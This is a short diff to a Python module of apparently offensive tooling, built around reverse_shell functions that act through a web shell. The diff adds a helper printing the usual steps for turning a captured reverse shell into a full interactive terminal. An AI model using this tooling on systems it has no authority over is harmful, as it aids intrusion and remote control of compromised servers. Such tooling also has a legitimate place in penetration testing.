@@ -8,6 +8,7 @@ from __future__ import annotations
 
 import contextlib
 import shlex
+import shutil
 import subprocess
 import threading
 import time
@@ -81,6 +82,31 @@ def reverse_shell(ws: WebShell, ip: str, port: int | str, method: str = "auto") 
         log.warning(f"{name} returned without connecting; trying next method.")
     log.error("No reverse-shell method succeeded.")
     return False
+
+
+def pty_upgrade_hints(shell: str = "/bin/bash") -> str:
+    """Return the canonical steps to upgrade a dumb reverse shell to a full PTY.
+
+    The classic ``pty.spawn`` + ``stty raw -echo`` dance gives job control,
+    tab-completion, arrow keys and a sane terminal. The local terminal's size is
+    filled in so the remote ``stty`` matches your window.
+    """
+    size = shutil.get_terminal_size((80, 24))
+    return "\n".join(
+        [
+            "PTY upgrade (run inside the reverse shell, then follow the local steps):",
+            "  1. spawn a PTY (first that exists):",
+            f"     python3 -c 'import pty; pty.spawn(\"{shell}\")'",
+            f"     python  -c 'import pty; pty.spawn(\"{shell}\")'",
+            f"     script -qc {shell} /dev/null",
+            "  2. background it: press Ctrl-Z",
+            "  3. on YOUR machine:    stty raw -echo; fg",
+            "       (then press Enter twice)",
+            "  4. back in the shell:  export TERM=xterm",
+            f"     stty rows {size.lines} cols {size.columns}",
+            "  Tip: restore your terminal afterwards with `reset` or `stty sane`.",
+        ]
+    )
 
 
 def reverse_shell_with_listener(
